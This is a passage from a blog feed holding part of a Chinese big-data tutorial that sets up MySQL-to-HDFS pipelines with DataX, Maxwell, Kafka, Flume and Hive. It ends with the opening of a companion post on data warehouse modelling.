/opt/module/datax/job/import/gmall.coupon_info.json<br>/origin_data/gmall/db/coupon_info_full/$do_date</p><p>;;</p><p>“sku_attr_value”)</p><p>import_data /opt/module/datax/job/import/gmall.sku_attr_value.json<br>/origin_data/gmall/db/sku_attr_value_full/$do_date</p><p>;;</p><p>“sku_info”)</p><p>import_data /opt/module/datax/job/import/gmall.sku_info.json<br>/origin_data/gmall/db/sku_info_full/$do_date</p><p>;;</p><p>“sku_sale_attr_value”)</p><p>import_data /opt/module/datax/job/import/gmall.sku_sale_attr_value.json<br>/origin_data/gmall/db/sku_sale_attr_value_full/$do_date</p><p>;;</p><p>“spu_info”)</p><p>import_data /opt/module/datax/job/import/gmall.spu_info.json<br>/origin_data/gmall/db/spu_info_full/$do_date</p><p>;;</p><p>“all”)</p><p>import_data /opt/module/datax/job/import/gmall.activity_info.json<br>/origin_data/gmall/db/activity_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.activity_rule.json<br>/origin_data/gmall/db/activity_rule_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_category1.json<br>/origin_data/gmall/db/base_category1_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_category2.json<br>/origin_data/gmall/db/base_category2_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_category3.json<br>/origin_data/gmall/db/base_category3_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_dic.json<br>/origin_data/gmall/db/base_dic_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_province.json<br>/origin_data/gmall/db/base_province_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_region.json<br>/origin_data/gmall/db/base_region_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.base_trademark.json<br>/origin_data/gmall/db/base_trademark_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.cart_info.json<br>/origin_data/gmall/db/cart_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.coupon_info.json<br>/origin_data/gmall/db/coupon_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.sku_attr_value.json<br>/origin_data/gmall/db/sku_attr_value_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.sku_info.json<br>/origin_data/gmall/db/sku_info_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.sku_sale_attr_value.json<br>/origin_data/gmall/db/sku_sale_attr_value_full/$do_date</p><p>import_data /opt/module/datax/job/import/gmall.spu_info.json<br>/origin_data/gmall/db/spu_info_full/$do_date</p><p>;;</p><p>esac</p><p><strong>2）为mysql_to_hdfs_full.sh增加执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/mysql_to_hdfs_full.sh</p><p><strong>3）测试同步脚本</strong></p><p>[atguigu@hadoop102 bin]$ mysql_to_hdfs_full.sh all 2020-06-14</p><p><strong>4）检查同步结果</strong></p><p>查看HDFS目表路径是否出现全量表数据，全量表共15张。</p><h4 id="全量表同步总结"><a href="#全量表同步总结" class="headerlink" title="全量表同步总结"></a>全量表同步总结</h4><p>全量表同步逻辑比较简单，只需每日执行全量表数据同步脚本mysql_to_hdfs_full.sh即可。</p><h3 id="增量表数据同步"><a href="#增量表数据同步" class="headerlink" title="增量表数据同步"></a>增量表数据同步</h3><h4 id="数据通道-1"><a href="#数据通道-1" class="headerlink" title="数据通道"></a>数据通道</h4><h4 id="Maxwell配置"><a href="#Maxwell配置" class="headerlink" title="Maxwell配置"></a>Maxwell配置</h4><p>按照规划，有cart_info、comment_info等共计13张表需进行增量同步，默认情况下，Maxwell会同步binlog中的所有表的数据变更记录，因此我们需要对Maxwell进行配置，另其只同步这特定的13张表。</p><p>另外，为方便下游使用数据，还需对Maxwell进行配置，另其将不同表的数据发往不同的Kafka<br>Topic。Maxwell最终配置如下：</p><p><strong>1）修改Maxwell配置文件config.properties</strong></p><p>[atguigu@hadoop102 maxwell]$ vim /opt/module/maxwell/config.properties</p><p><strong>2）全部配置参数如下</strong></p><p>log_level=info</p><p>producer=kafka</p><p>kafka.bootstrap.servers=hadoop102:9092,hadoop103:9092</p><p>##kafka topic动态配置</p><p>kafka_topic=%{table}</p><p>## mysql login info</p><p>host=hadoop102</p><p>user=maxwell</p><p>password=maxwell</p><p>jdbc_options=useSSL=false&amp;serverTimezone=Asia/Shanghai</p><p>##表过滤，只同步特定的13张表</p><p>filter=<br>include:gmall.cart_info,include:gmall.comment_info,include:gmall.coupon_use,include:gmall.favor_info,include:gmall.order_detail,include:gmall.order_detail_activity,include:gmall.order_detail_coupon,include:gmall.order_info,include:gmall.order_refund_info,include:gmall.order_status_log,include:gmall.payment_info,include:gmall.refund_payment,include:gmall.user_info</p><p><strong>3）重新启动Maxwell</strong></p><p>[atguigu@hadoop102 bin]$ mxw.sh restart</p><p><strong>4）通道测试</strong></p><p><strong>（1）启动Zookeeper以及Kafka集群</strong></p><p><strong>（2）启动一个Kafka Console Consumer，消费任一topic数据</strong></p><p>[atguigu@hadoop103 kafka]$ bin/kafka-console-consumer.sh –bootstrap-server<br>hadoop102:9092 –topic <strong>cart_info</strong></p><p><strong>（3）生成模拟数据</strong></p><p>[atguigu@hadoop102 bin]$ cd /opt/module/db_log/</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p><strong>（4）观察Kafka消费者是否能消费到数据</strong></p><p>{“database”:”gmall”,”table”:”<strong>cart_info</strong>“,”type”:”update”,”ts”:1592270938,”xid”:13090,”xoffset”:1573,”data”:{“id”:100924,”user_id”:”93”,”sku_id”:16,”cart_price”:4488.00,”sku_num”:1,”img_url”:”<a href="http://47.93.148.192:8080/group1/M00/00/02/rBHu8l-sklaALrngAAHGDqdpFtU741.jpg&quot;,&quot;sku_name&quot;:&quot;%E5%8D%8E%E4%B8%BA">http://47.93.148.192:8080/group1/M00/00/02/rBHu8l-sklaALrngAAHGDqdpFtU741.jpg&quot;,&quot;sku_name&quot;:&quot;华为</a><br>HUAWEI P40 麒麟990 5G SoC芯片 5000万超感知徕卡三摄 30倍数字变焦<br>8GB+128GB亮黑色全网通5G手机”,”is_checked”:null,”create_time”:”2020-06-14<br>09:28:57”,”operate_time”:null,”is_ordered”:1,”order_time”:”2021-10-17<br>09:28:58”,”source_type”:”2401”,”source_id”:null},”old”:{“is_ordered”:0,”order_time”:null}}</p><h4 id="Flume配置"><a href="#Flume配置" class="headerlink" title="Flume配置"></a>Flume配置</h4><p><strong>1）Flume配置概述</strong></p><p>Flume需要将Kafka中各topic的数据传输到HDFS，故其需选用KafkaSource以及HDFSSink，Channe选用FileChanne。</p><p>需要注意的是，KafkaSource需订阅Kafka中的13个topic，HDFSSink需要将不同topic的数据写到不同的路径，并且路径中应当包含一层日期，用于区分每天的数据。关键配置如下：</p><p>具体数据示例如下：</p><p><strong>2）Flume配置实操</strong></p><p><strong>（1）创建Flume配置文件</strong></p><p>在hadoop104节点的Flume的job目录下创建kafka_to_hdfs_db.conf</p><p>[atguigu@hadoop104 flume]$ mkdir job</p><p>[atguigu@hadoop104 flume]$ vim job/kafka_to_hdfs_db.conf</p><p><strong>（2）配置文件内容如下</strong></p><p>a1.sources = r1</p><p>a1.channels = c1</p><p>a1.sinks = k1</p><p>a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSource</p><p>a1.sources.r1.batchSize = 5000</p><p>a1.sources.r1.batchDurationMillis = 2000</p><p>a1.sources.r1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092</p><p>a1.sources.r1.kafka.topics =<br>cart_info,comment_info,coupon_use,favor_info,order_detail_activity,order_detail_coupon,order_detail,order_info,order_refund_info,order_status_log,payment_info,refund_payment,user_info</p><p>a1.sources.r1.kafka.consumer.group.id = flume</p><p>a1.sources.r1.setTopicHeader = true</p><p>a1.sources.r1.topicHeader = topic</p><p>a1.sources.r1.interceptors = i1</p><p>a1.sources.r1.interceptors.i1.type =<br>com.atguigu.flume.interceptor.db.TimestampInterceptor$Builder</p><p>a1.channels.c1.type = file</p><p>a1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior2</p><p>a1.channels.c1.dataDirs = /opt/module/flume/data/behavior2/</p><p>a1.channels.c1.maxFileSize = 2146435071</p><p>a1.channels.c1.capacity = 1123456</p><p>a1.channels.c1.keep-alive = 6</p><p>#### sink1</p><p>a1.sinks.k1.type = hdfs</p><p>a1.sinks.k1.hdfs.path = /origin_data/gmall/db/%{topic}_inc/%Y-%m-%d</p><p>a1.sinks.k1.hdfs.filePrefix = db</p><p>a1.sinks.k1.hdfs.round = false</p><p>a1.sinks.k1.hdfs.rollInterval = 10</p><p>a1.sinks.k1.hdfs.rollSize = 134217728</p><p>a1.sinks.k1.hdfs.rollCount = 0</p><p>a1.sinks.k1.hdfs.fileType = CompressedStream</p><p>a1.sinks.k1.hdfs.codeC = gzip</p><p>#### 拼装</p><p>a1.sources.r1.channels = c1</p><p>a1.sinks.k1.channel= c1</p><p><strong>（3）编写Flume拦截器</strong></p><p>新建一个Maven项目，并在pom.xml文件中加入如下配置</p><p>&lt;dependencies&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.apache.flume&lt;/groupId&gt;<br>&lt;artifactId&gt;flume-ng-core&lt;/artifactId&gt;<br>&lt;version&gt;1.9.0&lt;/version&gt;<br>&lt;scope&gt;provided&lt;/scope&gt;<br>&lt;/dependency&gt;  </p><p>&lt;dependency&gt;<br>&lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>&lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>&lt;version&gt;1.2.62&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;/dependencies&gt;  </p><p>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>&lt;version&gt;2.3.2&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;source&gt;1.8&lt;/source&gt;<br>&lt;target&gt;1.8&lt;/target&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;<br>&lt;configuration&gt;<br>&lt;descriptorRefs&gt;<br>&lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;<br>&lt;/descriptorRefs&gt;<br>&lt;/configuration&gt;<br>&lt;executions&gt;<br>&lt;execution&gt;<br>&lt;id&gt;make-assembly&lt;/id&gt;<br>&lt;phase&gt;package&lt;/phase&gt;<br>&lt;goals&gt;<br>&lt;goal&gt;single&lt;/goal&gt;<br>&lt;/goals&gt;<br>&lt;/execution&gt;<br>&lt;/executions&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;</p><p>在com.atguigu.flume.interceptor.db包下创建TimestampInterceptor类</p><p>package com.atguigu.flume.interceptor.db;</p><p>import com.alibaba.fastjson.JSONObject;</p><p>import org.apache.flume.Context;</p><p>import org.apache.flume.Event;</p><p>import org.apache.flume.interceptor.Interceptor;</p><p>import java.nio.charset.StandardCharsets;</p><p>import java.util.List;</p><p>import java.util.Map;</p><p>public class TimestampInterceptor implements Interceptor {</p><p>@Override</p><p>public void initialize() {</p><p>}</p><p>@Override</p><p>public Event intercept(Event event) {</p><p>Map&lt;String, String&gt; headers = event.getHeaders();</p><p>String log = new String(event.getBody(), StandardCharsets.UTF_8);</p><p>JSONObject jsonObject = JSONObject.parseObject(log);</p><p>Long ts = jsonObject.getLong(“ts”);</p><p>//Maxwell输出的数据中的ts字段时间戳单位为秒，Flume HDFSSink要求单位为毫秒</p><p>String timeMills = String.valueOf(ts * 1000);</p><p>headers.put(“timestamp”, timeMills);</p><p>return event;</p><p>}</p><p>@Override</p><p>public List&lt;Event&gt; intercept(List&lt;Event&gt; events) {</p><p>for (Event event : events) {</p><p>intercept(event);</p><p>}</p><p>return events;</p><p>}</p><p>@Override</p><p>public void close() {</p><p>}</p><p>public static class Builder implements Interceptor.Builder {</p><p>@Override</p><p>public Interceptor build() {</p><p>return new TimestampInterceptor();</p><p>}</p><p>@Override</p><p>public void configure(Context context) {</p><p>}</p><p>}</p><p>}</p><p>重新打包</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/361c38002f9891ce01e4771948d70b01.png"></p><p>将打好的包放入到hadoop104的/opt/module/flume/lib文件夹下</p><p>[atguigu@hadoop102 lib]$ ls | grep interceptor</p><p>flume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar</p><p><strong>3）通道测试</strong></p><p><strong>（1）启动Zookeeper、Kafka集群</strong></p><p><strong>（2）启动hadoop104的Flume</strong></p><p>[atguigu@hadoop104 flume]$ bin/flume-ng agent -n a1 -c conf/ -f<br>job/kafka_to_hdfs_db.conf -Dflume.root.logger=info,console</p><p><strong>（3）生成模拟数据</strong></p><p>[atguigu@hadoop102 bin]$ cd /opt/module/db_log/</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p><strong>（4）观察HDFS上的目标路径是否有数据出现</strong></p><p>若HDFS上的目标路径已有增量表的数据出现了，就证明数据通道已经打通。</p><p><strong>（5）数据目标路径的日期说明</strong></p><p>仔细观察，会发现目标路径中的日期，并非模拟数据的业务日期，而是当前日期。这是由于Maxwell输出的JSON字符串中的ts字段的值，是数据的变动日期。而真实场景下，数据的业务日期与变动日期应当是一致的。</p><p>此处为了模拟真实环境，对Maxwell源码进行了改动，增加了一个参数mock_date，该参数的作用就是指定Maxwell输出JSON字符串的ts时间戳的日期，接下来进行测试。</p><p>修改Maxwell配置文件config.properties，增加mock_date参数，如下</p><p>##该日期须和/opt/module/db_log/application.properties中的mock.date参数保持一致</p><p><strong>mock_date=2020-06-14</strong></p><p>注：该参数仅供学习使用<strong>，修改该参数后重启Maxwell才可生效</strong>。</p><p>重启Maxwell</p><p>[atguigu@hadoop102 bin]$ mxw.sh restart</p><p>重新生成模拟数据</p><p>[atguigu@hadoop102 bin]$ cd /opt/module/db_log/</p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-11-14.jar</p><p>观察HDFS目标路径日期是否正常</p><p><strong>4）编写Flume启停脚本</strong></p><p>为方便使用，此处编写一个Flume的启停脚本</p><p><strong>1）在hadoop102节点的/home/atguigu/bin目录下创建脚本f3.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim f3.sh</p><p>在脚本中填写如下内容</p><p>##!/bin/bash</p><p>case $1 in</p><p>“start”)</p><p>echo “ ——–启动 hadoop104 业务数据flume——-“</p><p>ssh hadoop104 “nohup /opt/module/flume/bin/flume-ng agent -n a1 -c<br>/opt/module/flume/conf -f /opt/module/flume/job/kafka_to_hdfs_db.conf<br>&gt;/dev/null 2&gt;&amp;1 &amp;”</p><p>;;</p><p>“stop”)</p><p>echo “ ——–停止 hadoop104 业务数据flume——-“</p><p>ssh hadoop104 “ps -ef | grep kafka_to_hdfs_db.conf | grep -v grep |awk<br>‘{print \$2}’ | xargs -n1 kill”</p><p>;;</p><p>esac</p><p><strong>2）增加脚本执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x f3.sh</p><p><strong>3）f3启动</strong></p><p>[atguigu@hadoop102 module]$ f3.sh start</p><p><strong>4）f3停止</strong></p><p>[atguigu@hadoop102 module]$ f3.sh stop</p><h4 id="增量表首日全量同步"><a href="#增量表首日全量同步" class="headerlink" title="增量表首日全量同步"></a>增量表首日全量同步</h4><p>通常情况下，增量表需要在首日进行一次全量同步，后续每日再进行增量同步，首日全量同步可以使用Maxwell的bootstrap功能，方便起见，下面编写一个增量表首日全量同步脚本。</p><p><strong>1）在~/bin目录创建mysql_to_kafka_inc_init.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim mysql_to_kafka_inc_init.sh</p><p>脚本内容如下</p><p>##!/bin/bash</p><p>## 该脚本的作用是初始化所有的增量表，只需执行一次</p><p>MAXWELL_HOME=/opt/module/maxwell</p><p>import_data() {</p><p>$MAXWELL_HOME/bin/maxwell-bootstrap –database gmall –table $1 –config<br>$MAXWELL_HOME/config.properties</p><p>}</p><p>case $1 in</p><p>“cart_info”)</p><p>import_data cart_info</p><p>;;</p><p>“comment_info”)</p><p>import_data comment_info</p><p>;;</p><p>“coupon_use”)</p><p>import_data coupon_use</p><p>;;</p><p>“favor_info”)</p><p>import_data favor_info</p><p>;;</p><p>“order_detail”)</p><p>import_data order_detail</p><p>;;</p><p>“order_detail_activity”)</p><p>import_data order_detail_activity</p><p>;;</p><p>“order_detail_coupon”)</p><p>import_data order_detail_coupon</p><p>;;</p><p>“order_info”)</p><p>import_data order_info</p><p>;;</p><p>“order_refund_info”)</p><p>import_data order_refund_info</p><p>;;</p><p>“order_status_log”)</p><p>import_data order_status_log</p><p>;;</p><p>“payment_info”)</p><p>import_data payment_info</p><p>;;</p><p>“refund_payment”)</p><p>import_data refund_payment</p><p>;;</p><p>“user_info”)</p><p>import_data user_info</p><p>;;</p><p>“all”)</p><p>import_data cart_info</p><p>import_data comment_info</p><p>import_data coupon_use</p><p>import_data favor_info</p><p>import_data order_detail</p><p>import_data order_detail_activity</p><p>import_data order_detail_coupon</p><p>import_data order_info</p><p>import_data order_refund_info</p><p>import_data order_status_log</p><p>import_data payment_info</p><p>import_data refund_payment</p><p>import_data user_info</p><p>;;</p><p>esac</p><p><strong>2）为mysql_to_kafka_inc_init.sh增加执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/mysql_to_kafka_inc_init.sh</p><p><strong>3）测试同步脚本</strong></p><p><strong>（1）清理历史数据</strong></p><p>为方便查看结果，现将HDFS上之前同步的增量表数据删除</p><p>[atguigu@hadoop102 ~]$ hadoop fs -ls /origin_data/gmall/db | grep _inc |<br>awk ‘{print $8}’ | xargs hadoop fs -rm -r -f</p><p><strong>（2）执行同步脚本</strong></p><p>[atguigu@hadoop102 bin]$ mysql_to_kafka_inc_init.sh all</p><p><strong>4）检查同步结果</strong></p><p>观察HDFS上是否重新出现增量表数据。</p><h4 id="增量表同步总结"><a href="#增量表同步总结" class="headerlink" title="增量表同步总结"></a>增量表同步总结</h4><p>增量表同步，需要在首日进行一次全量同步，后续每日才是增量同步。首日进行全量同步时，需先启动数据通道，包括Maxwell、Kafka、Flume，然后执行增量表首日同步脚本mysql_to_kafka_inc_init.sh进行同步。后续每日只需保证采集通道正常运行即可，Maxwell便会实时将变动数据发往Kafka。</p><h2 id="第4章-数仓环境准备"><a href="#第4章-数仓环境准备" class="headerlink" title="第4章 数仓环境准备"></a>第4章 数仓环境准备</h2><h3 id="Hive安装部署"><a href="#Hive安装部署" class="headerlink" title="Hive安装部署"></a>Hive安装部署</h3><p><strong>1）把apache-hive-3.1.2-bin.tar.gz上传到linux的/opt/software目录下</strong></p><p><strong>2）解压apache-hive-3.1.2-bin.tar.gz到/opt/module/目录下面</strong></p><p>[atguigu@hadoop102 software]$ tar -zxvf<br>/opt/software/apache-hive-3.1.2-bin.tar.gz -C /opt/module/</p><p><strong>3）修改apache-hive-3.1.2-bin.tar.gz的名称为hive</strong></p><p>[atguigu@hadoop102 software]$ mv /opt/module/apache-hive-3.1.2-bin/<br>/opt/module/hive</p><p><strong>4）修改/etc/profile.d/my_env.sh，添加环境变量</strong></p><p>[atguigu@hadoop102 software]$ sudo vim /etc/profile.d/my_env.sh</p><p>添加内容</p><p>##HIVE_HOME</p><p>export HIVE_HOME=/opt/module/hive</p><p>export PATH=$PATH:$HIVE_HOME/bin</p><p>重启Xshell对话框或者source一下 /etc/profile.d/my_env.sh文件，使环境变量生效</p><p>[atguigu@hadoop102 software]$ source /etc/profile.d/my_env.sh</p><p><strong>5）解决日志Jar包冲突，进入/opt/module/hive/lib目录</strong></p><p>[atguigu@hadoop102 lib]$ mv log4j-slf4j-impl-2.10.0.jar<br>log4j-slf4j-impl-2.10.0.jar.bak</p><h3 id="Hive元数据配置到MySQL"><a href="#Hive元数据配置到MySQL" class="headerlink" title="Hive元数据配置到MySQL"></a>Hive元数据配置到MySQL</h3><h4 id="拷贝驱动"><a href="#拷贝驱动" class="headerlink" title="拷贝驱动"></a>拷贝驱动</h4><p>将MySQL的JDBC驱动拷贝到Hive的lib目录下</p><p>[atguigu@hadoop102 lib]$ cp /opt/software/mysql-connector-java-5.1.27.jar<br>/opt/module/hive/lib/</p><h4 id="配置MySQL作为元数据存储"><a href="#配置MySQL作为元数据存储" class="headerlink" title="配置MySQL作为元数据存储"></a>配置MySQL作为元数据存储</h4><p>在$HIVE_HOME/conf目录下新建hive-site.xml文件</p><p>[atguigu@hadoop102 conf]$ vim hive-site.xml</p><p>添加如下内容</p><p>&lt;?xml version=”1.0”?&gt;</p><p>&lt;?xml-stylesheet type=”text/xsl” href=”configuration.xsl”?&gt;</p><p>&lt;configuration&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</p><p>&lt;value&gt;jdbc:mysql://hadoop102:3306/metastore?useSSL=false&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</p><p>&lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</p><p>&lt;value&gt;root&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</p><p>&lt;value&gt;123456&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt;</p><p>&lt;value&gt;/user/hive/warehouse&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.metastore.schema.verification&lt;/name&gt;</p><p>&lt;value&gt;false&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.server2.thrift.port&lt;/name&gt;</p><p>&lt;value&gt;10000&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.server2.thrift.bind.host&lt;/name&gt;</p><p>&lt;value&gt;hadoop102&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.metastore.event.db.notification.api.auth&lt;/name&gt;</p><p>&lt;value&gt;false&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.cli.print.header&lt;/name&gt;</p><p>&lt;value&gt;true&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.cli.print.current.db&lt;/name&gt;</p><p>&lt;value&gt;true&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;/configuration&gt;</p><h3 id="启动Hive"><a href="#启动Hive" class="headerlink" title="启动Hive"></a>启动Hive</h3><h4 id="初始化元数据库"><a href="#初始化元数据库" class="headerlink" title="初始化元数据库"></a>初始化元数据库</h4><p><strong>1）登陆MySQL</strong></p><p>[atguigu@hadoop102 conf]$ mysql -uroot -p123456</p><p><strong>2）新建Hive元数据库</strong></p><p>mysql&gt; create database metastore;</p><p>mysql&gt; quit;</p><p><strong>3）初始化Hive元数据库</strong></p><p>[atguigu@hadoop102 conf]$ schematool -initSchema -dbType mysql -verbose</p><h4 id="启动hive客户端"><a href="#启动hive客户端" class="headerlink" title="启动hive客户端"></a>启动hive客户端</h4><p><strong>1）启动Hive客户端</strong></p><p>[atguigu@hadoop102 hive]$ bin/hive</p><p><strong>2）查看一下数据库</strong></p><p>hive (default)&gt; show databases;</p><p>OK</p><p>database_name</p><p>default</p><h3 id="修改元数据库字符集"><a href="#修改元数据库字符集" class="headerlink" title="修改元数据库字符集"></a>修改元数据库字符集</h3><p>Hive元数据库的字符集默认为Latin1，由于其不支持中文字符，故若建表语句中包含中文注释，会出现乱码现象。如需解决乱码问题，须做以下修改。</p><p><strong>1）修改Hive元数据库中存储注释的字段的字符集为utf-8</strong></p><p><strong>（1）字段注释</strong></p><p>mysql&gt; alter table COLUMNS_V2 modify column COMMENT varchar(256) character set<br>utf8;</p><p><strong>（2）表注释</strong></p><p>mysql&gt; alter table TABLE_PARAMS modify column PARAM_VALUE mediumtext character<br>set utf8;</p><p><strong>2）修改hive-site.xml中JDBC URL，如下</strong></p><p>&lt;property&gt;</p><p>&lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</p><p>&lt;value&gt;jdbc:mysql://hadoop102:3306/metastore?useSSL=false<strong>&amp;amp;useUnicode=true&amp;characterEncoding=UTF-8</strong>&lt;/value&gt;</p><p>&lt;/property&gt;</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据仓库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电商数仓V5.0</title>
      <link href="/2022/01/22/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93V5.0/"/>
      <url>/2022/01/22/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93V5.0/</url>
      
        <content type="html"><![CDATA[<p>尚硅谷大数据项目之电商数仓（电商数据仓库系统）</p><p>(作者：尚硅谷大数据研发部)</p><p>版本：V5.0</p><h2 id="第1章-数据仓库概述"><a href="#第1章-数据仓库概述" class="headerlink" title="第1章 数据仓库概述"></a>第1章 数据仓库概述</h2><h3 id="数据仓库概念"><a href="#数据仓库概念" class="headerlink" title="数据仓库概念"></a>数据仓库概念</h3><p>数据仓库是一个为数据分析而设计的企业级数据管理系统。数据仓库可集中、整合多个信息源的大量数据，借助数据仓库的分析能力，企业可从数据中获得宝贵的信息进而改进决策。同时，随着时间的推移，数据仓库中积累的大量历史数据对于数据科学家和业务分析师也是十分宝贵的。</p><h3 id="数据仓库核心架构"><a href="#数据仓库核心架构" class="headerlink" title="数据仓库核心架构"></a>数据仓库核心架构</h3><h2 id="第2章-数据仓库建模概述"><a href="#第2章-数据仓库建模概述" class="headerlink" title="第2章 数据仓库建模概述"></a>第2章 数据仓库建模概述</h2><h3 id="数据仓库建模的意义"><a href="#数据仓库建模的意义" class="headerlink" title="数据仓库建模的意义"></a>数据仓库建模的意义</h3><p>如果把数据看作图书馆里的书，我们希望看到它们在书架上分门别类地放置；如果把数据看作城市的建筑，我们希望城市规划布局合理；如果把数据看作电脑文件和文件夹，我们希望按照自己的习惯有很好的文件夹组织方式，而不是糟糕混乱的桌面，经常为找一个文件而不知所措。</p><p>数据模型就是数据组织和存储方法，它强调从业务、数据存取和使用角度合理存储数据。只有将数据有序的组织和存储起来之后，数据才能得到高性能、低成本、高效率、高质量的使用。</p><p>高性能：良好的数据模型能够帮助我们快速查询所需要的数据。</p><p>低成本：良好的数据模型能减少重复计算，实现计算结果的复用，降低计算成本。</p><p>高效率：良好的数据模型能极大的改善用户使用数据的体验，提高使用数据的效率。</p><p>高质量：良好的数据模型能改善数据统计口径的混乱，减少计算错误的可能性。</p><h3 id="数据仓库建模方法论"><a href="#数据仓库建模方法论" class="headerlink" title="数据仓库建模方法论"></a>数据仓库建模方法论</h3><h4 id="ER模型"><a href="#ER模型" class="headerlink" title="ER模型"></a>ER模型</h4><p>数据仓库之父Bill Inmon提出的建模方法是从全企业的高度，用实体关系（Entity<br>Relationship，ER）模型来描述企业业务，并用规范化的方式表示出来，在范式理论上符合3NF。</p><p><strong>1）实体关系模型</strong></p><p>实体关系模型将复杂的数据抽象为两个概念——实体和关系。实体表示一个对象，例如学生、班级，关系是指两个实体之间的关系，例如学生和班级之间的从属关系。</p><p><strong>2）数据库规范化</strong></p><p>数据库规范化是使用一系列范式设计数据库（通常是关系型数据库）的过程，其目的是减少数据冗余，增强数据的一致性。</p><p>这一系列范式就是指在设计关系型数据库时，需要遵从的不同的规范。关系型数据库的范式一共有六种，分别是第一范式（1NF）、第二范式（2NF）、第三范式（3NF）、巴斯-科德范式（BCNF）、第四范式(4NF）和第五范式（5NF）。遵循的范式级别越高，数据冗余性就越低。</p><p><strong>3）三范式</strong></p><p><strong>（1）函数依赖</strong></p><p><strong>（2）第一范式</strong></p><p><strong>（3）第二范式</strong></p><p><strong>（4）第三范式</strong></p><p>下图为一个采用Bill<br>Inmon倡导的建模方法构建的模型，从图中可以看出，较为松散、零碎，物理表数量多。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/250b56b4e3e1198e1f6df4cfadcf3651.png"></p><p>这种建模方法的出发点是整合数据，其目的是将整个企业的数据进行组合和合并，并进行规范处理，减少数据冗余性，保证数据的一致性。这种模型并不适合直接用于分析统计。</p><h4 id="维度模型"><a href="#维度模型" class="headerlink" title="维度模型"></a>维度模型</h4><p>数据仓库领域的令一位大师——Ralph<br>Kimball倡导的建模方法为维度建模。维度模型将复杂的业务通过事实和维度两个概念进行呈现。事实通常对应业务过程，而维度通常对应业务过程发生时所处的环境。</p><p><strong>注</strong>：业务过程可以概括为一个个不可拆分的行为事件，例如电商交易中的下单，取消订单，付款，退单等，都是业务过程。</p><p>下图为一个典型的维度模型，其中位于中心的SalesOrder为事实表，其中保存的是下单这个业务过程的所有记录。位于周围每张表都是维度表，包括Date（日期），Customer（顾客），Product（产品），Location（地区）等，这些维度表就组成了每个订单发生时所处的环境，即何人、何时、在何地下单了何种产品。从图中可以看出，模型相对清晰、简洁。</p><p><img 